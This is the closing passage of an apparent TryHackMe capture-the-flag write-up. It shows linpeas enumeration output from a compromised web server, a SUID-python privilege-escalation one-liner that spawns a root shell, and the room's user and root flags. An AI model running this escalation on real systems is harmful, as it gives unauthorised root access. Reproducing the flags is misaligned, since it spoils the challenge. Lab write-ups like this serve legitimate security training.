-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/9665/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jan 31  2020 /snap/core/9665/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 109K Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Feb 11  2020 /snap/core/9665/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 43K Jan  8  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 27K Jan  8  2020 /bin/umount  --->  BSD/Linux(08-1996)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd                                                                                                                                                                                 
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 31K Jan  8  2020 /usr/bin/wall
-rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/python
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8268/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8268/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/8268/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/8268/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/8268/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/8268/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/8268/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Oct 10  2019 /snap/core/8268/usr/bin/wall
-rwsr-sr-x 1 root root 105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/9665/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/9665/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/9665/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/9665/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/9665/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/9665/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/9665/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/9665/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/9665/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K May 26  2020 /snap/core/9665/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/9665/usr/bin/wall

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                                                                                                                    
/etc/ld.so.conf                                                                                                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
Current env capabilities:                                                                                                                                                                                                                   
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient                                                                                                                                                                                     
-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 26245 Jul 10  2020 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                                                                     
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                                                                  
/usr/bin/gettext.sh                                                                                                                                                                                                                         

╔══════════╣ Executable files potentially added by user (limit 70)
2022-10-31+04:08:31.2290023130 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control                                                                                                                            
2022-10-31+04:08:31.2262819700 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
2022-10-31+04:08:31.2235889910 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
2022-10-31+04:08:31.2210498970 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
2022-10-31+04:08:31.2184946810 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
2022-10-31+04:08:31.2160096660 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
2022-10-31+04:08:31.2134602490 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
2022-10-31+04:08:31.2110386920 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
2022-10-31+04:08:31.2084199520 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
2022-10-31+04:08:31.2059839380 /var/lib/lxcfs/cgroup/memory/system.slice/snap-core-9665.mount/cgroup.event_control
2022-10-31+04:08:31.2034175360 /var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
2022-10-31+04:08:31.2007625910 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
2022-10-31+04:08:31.1981947420 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
2022-10-31+04:08:31.1955941590 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
2022-10-31+04:08:31.1930895320 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
2022-10-31+04:08:31.1904579220 /var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
2022-10-31+04:08:31.1879992050 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
2022-10-31+04:08:31.1852134060 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
2022-10-31+04:08:31.1827316230 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
2022-10-31+04:08:31.1803271230 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
2022-10-31+04:08:31.1778513840 /var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
2022-10-31+04:08:31.1753746220 /var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
2022-10-31+04:08:31.1728023800 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
2022-10-31+04:08:31.1702782870 /var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
2022-10-31+04:08:31.1678645830 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
2022-10-31+04:08:31.1653636620 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
2022-10-31+04:08:31.1629762880 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
2022-10-31+04:08:31.1603688410 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
2022-10-31+04:08:31.1576917900 /var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
2022-10-31+04:08:31.1550594240 /var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8268.mount/cgroup.event_control
2022-10-31+04:08:31.1523810360 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
2022-10-31+04:08:31.1496547120 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
2022-10-31+04:08:31.1470912500 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
2020-08-04+17:39:14.5674731670 /usr/bin/curl
2020-08-04+17:38:50.6713700460 /bin/cat
2020-08-04+15:03:11.4334349640 /etc/console-setup/cached_setup_terminal.sh
2020-08-04+15:03:11.4334349640 /etc/console-setup/cached_setup_font.sh
2020-08-04+15:03:11.4294349640 /etc/console-setup/cached_setup_keyboard.sh
2020-08-04+14:54:41.2833994890 /etc/network/if-up.d/mtuipv6
2020-08-04+14:54:41.2833994890 /etc/network/if-pre-up.d/mtuipv6

╔══════════╣ Unexpected in root
/swap.img                                                                                                                                                                                                                                   
/vmlinuz.old
/initrd.img.old
/vmlinuz
/initrd.img

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                                                                           
total 36                                                                                                                                                                                                                                    
drwxr-xr-x  2 root root 4096 Aug  4  2020 .
drwxr-xr-x 96 root root 4096 Aug  4  2020 ..
-rw-r--r--  1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root 3417 Jan 15  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x  1 root root  873 Jan 15  2020 Z99-cloudinit-warnings.sh
-rw-r--r--  1 root root  825 Oct 30  2019 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                             
                                                                                                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                                                                                                                            
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                                                                            
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/www/.config/lxc/config.yml                                                                                                                                                                                                             
/var/www/.gnupg/pubring.kbx
/var/www/.gnupg/trustdb.gpg
/var/log/kern.log
/var/log/auth.log
/var/log/journal/baf7439272ce43a98cc8afde5b086a25/system.journal
/var/log/syslog

logrotate 3.11.0

╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                                                                                                                                            
╔══════════╣ Files inside others home (limit 20)
/home/rootme/.profile                                                                                                                                                                                                                       
/home/rootme/.bash_logout
/home/rootme/.sudo_as_admin_successful
/home/rootme/.bashrc
/home/rootme/.bash_history
/home/test/.profile
/home/test/.bash_logout
/home/test/.bashrc
/home/test/.bash_history
/var/www/.config/lxc/config.yml
/var/www/html/index.php
/var/www/html/panel/index.php
/var/www/html/js/maquina_de_escrever.js
/var/www/html/uploads/revshell.phtml
/var/www/html/Website.zip
/var/www/html/css/panel.css
/var/www/html/css/home.css
/var/www/.gnupg/pubring.kbx
/var/www/.gnupg/trustdb.gpg
/var/www/user.txt

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2765 Feb  3  2020 /etc/apt/sources.list.curtin.old                                                                                                                                                                   
-rw-r--r-- 1 root root 35544 Dec  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 10939 Aug  4  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 2746 Dec  5  2019 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 217484 Jul  9  2020 /usr/src/linux-headers-4.15.0-112-generic/.config.old
-rw-r--r-- 1 root root 0 Jul  9  2020 /usr/src/linux-headers-4.15.0-112-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jul  9  2020 /usr/src/linux-headers-4.15.0-112-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 7857 Jul  9  2020 /lib/modules/4.15.0-112-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 7905 Jul  9  2020 /lib/modules/4.15.0-112-generic/kernel/drivers/net/team/team_mode_activebackup.ko

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /snap/core/8268/lib/firmware/regulatory.db: CRDA wireless regulatory database file                                                                                                                                                    
Found /snap/core/9665/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                                                                  
total 28K
drwxr-xr-x  5 www-data www-data 4.0K Oct 31 04:08 .
drwxr-xr-x 14 root     root     4.0K Aug  4  2020 ..
-rw-------  1 www-data www-data  129 Aug  4  2020 .bash_history
drwxr-x---  3 www-data www-data 4.0K Oct 31 04:08 .config
drwx------  3 www-data www-data 4.0K Oct 31 04:08 .gnupg
drwxr-xr-x  6 www-data www-data 4.0K Aug  4  2020 html
-rw-r--r--  1 www-data www-data   21 Aug  4  2020 user.txt


╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 rootme rootme 220 Apr  4  2018 /home/rootme/.bash_logout                                                                                                                                                                       
-rw-r--r-- 1 test test 220 Aug  4  2020 /home/test/.bash_logout
-rw-r--r-- 1 root root 37 Oct 31 03:11 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Oct 31 03:10 /run/cloud-init/.ds-identify.result
-rw------- 1 root root 0 Feb  3  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 1531 Aug  4  2020 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 1531 Aug  4  2020 /var/cache/apparmor/.features
-rw-r--r-- 1 landscape landscape 0 Feb  3  2020 /var/lib/landscape/.cleanup.user
-rw------- 1 root root 0 Dec  6  2019 /snap/core/8268/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/8268/etc/skel/.bash_logout
-rw------- 1 root root 0 Jul 10  2020 /snap/core/9665/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/9665/etc/skel/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 31188 Aug  4  2020 /var/backups/apt.extended_states.0                                                                                                                                                                

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/dev/shm/linpeas.sh
/run/lock
/run/lock/apache2
/run/screen
/snap/core/8268/run/lock
/snap/core/8268/tmp
/snap/core/8268/var/tmp
/snap/core/9665/run/lock
/snap/core/9665/tmp
/snap/core/9665/var/tmp
/tmp
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8268.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-9665.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp
/var/www
/var/www/.bash_history
/var/www/.config
/var/www/.config/lxc
/var/www/.config/lxc/config.yml
/var/www/.gnupg
/var/www/.gnupg/private-keys-v1.d
/var/www/.gnupg/pubring.kbx
/var/www/.gnupg/trustdb.gpg
/var/www/html
/var/www/html/Website.zip
/var/www/html/css
/var/www/html/css/home.css
/var/www/html/css/panel.css
/var/www/html/index.php
/var/www/html/js
/var/www/html/js/maquina_de_escrever.js
/var/www/html/panel
/var/www/html/panel/index.php
/var/www/html/uploads
/var/www/html/uploads/revshell.phtml
/var/www/user.txt

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
  Group www-data:                                                                                                                                                                                                                           
/dev/shm/linpeas.sh                                                                                                                                                                                                                         
/var/www/.config/lxc/config.yml
/var/www/html/panel/index.php
/var/www/html/uploads

╔══════════╣ Searching passwords in history files
                                                                                                                                                                                                                                            
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/john/password.lst

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:                                                                                                                                                                                            
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2020-02-03 18:22:20 configure base-passwd:amd64 3.5.44 3.5.44
2020-02-03 18:22:20 install base-passwd:amd64 <none> 3.5.44
2020-02-03 18:22:20 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status half-installed base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status installed base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status half-installed base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:22 upgrade base-passwd:amd64 3.5.44 3.5.44
2020-02-03 18:22:25 install passwd:amd64 <none> 1:4.5-1ubuntu1
2020-02-03 18:22:25 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:25 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:26 configure base-passwd:amd64 3.5.44 <none>
2020-02-03 18:22:26 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:26 status installed base-passwd:amd64 3.5.44
2020-02-03 18:22:26 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:27 configure passwd:amd64 1:4.5-1ubuntu1 <none>
2020-02-03 18:22:27 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:27 status installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:27 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 configure passwd:amd64 1:4.5-1ubuntu2 <none>
2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status installed passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
2020-08-04 15:03:28,095 - cc_set_passwords.py[DEBUG]: Leaving SSH config 'PasswordAuthentication' unchanged. ssh_pwauth=None
2020-08-04 15:03:28,095 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2020-08-04 17:08:24,849 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-08-04 17:08:24,849 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-08-04 19:33:54,198 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-08-04 19:33:54,198 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-10-31 03:12:29,879 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-10-31 03:12:29,879 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
Aug 04 11:51:13 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Aug 04 11:51:13 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.44) ...
Setting up passwd (1:4.5-1ubuntu1) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.44) ...
Unpacking base-passwd (3.5.44) over (3.5.44) ...
Unpacking passwd (1:4.5-1ubuntu1) ...
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                                                                          
                                ╚════════════════╝                                                                                                                                                                                          
Regexes to search for API keys aren't activated, use param '-r' 

```

This line stands out:
```
-rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/python
```

Use python to spawn bash:

```
python -c "import os; os.execl('/bin/sh','bash','-p');"
```

As root:
```
cat /root/root.txt

THM{pr1v1l3g3_3sc4l4t10n}
```

## Flag

1. User.txt

```
THM{y0u_g0t_a_sh3ll}
```

2. Privesc

```
THM{pr1v1l3g3_3sc4l4t10n}
```
